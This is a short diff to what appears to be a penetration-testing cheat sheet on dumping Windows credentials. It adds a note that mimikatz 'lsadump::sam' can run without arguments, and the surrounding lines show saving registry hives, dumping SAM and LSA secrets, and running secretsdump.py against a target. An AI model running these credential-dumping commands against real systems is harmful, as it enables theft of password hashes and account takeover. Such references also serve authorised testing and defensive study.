@@ -692,6 +692,8 @@ reg save HKLM\SYSTEM c:\path\to\SYSTEM
 ```powershell
 lsadump::sam /system:c:\path\to\SYSTEM /sam:c:c:\path\to\SAM
 ```
+or just use : `lsadump::sam`
+
 **[ 📝 ] Notes** : *you can dump SAM and LSA with crackmapexec **or** secretdump using these commands :*
 ```bash
 secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
